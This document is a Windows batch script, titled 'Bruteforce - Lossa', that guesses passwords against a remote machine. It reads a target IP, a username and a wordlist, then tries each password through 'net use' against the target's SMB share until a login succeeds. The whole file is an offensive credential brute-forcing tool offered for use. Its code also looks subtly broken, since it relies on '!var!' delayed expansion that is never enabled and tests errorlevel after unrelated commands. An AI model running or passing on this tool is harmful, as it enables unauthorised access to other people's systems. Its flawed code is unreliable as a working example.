@echo off
title Bruteforce - Lossa
color A
chcp 65001 >nul
cls

call :banner
pause

echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List (e.g., passwords.txt): "
echo.

set /a count=1

for /f "tokens=* delims=" %%a in (%wordlist%) do (
    set "pass=%%a"
    call :attempt
)

echo Password not Found :(
pause
exit /b

:banner
echo                ██████  ██████  ██    ██ ████████ ███████       ███████  ██████  ██████   ██████ ███████ 
echo                ██   ██ ██   ██ ██    ██    ██    ██            ██      ██    ██ ██   ██ ██      ██      
echo                ██████  ██████  ██    ██    ██    █████   █████ █████   ██    ██ ██████  ██      █████   
echo                ██   ██ ██   ██ ██    ██    ██    ██            ██      ██    ██ ██   ██ ██      ██      
echo                ██████  ██   ██  ██████     ██    ███████       ██       ██████  ██   ██  ██████ ███████ 
echo.
goto :eof

:attempt
call set "currentPass=%%pass%%"
net use \\%ip% /user:%user% "!currentPass!" >nul 2>&1
echo [ATTEMPT %count%] [!currentPass!]
set /a count+=1
if %errorlevel% EQU 0 (
    set "pass=!currentPass!"
    goto success
)
goto :eof

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit
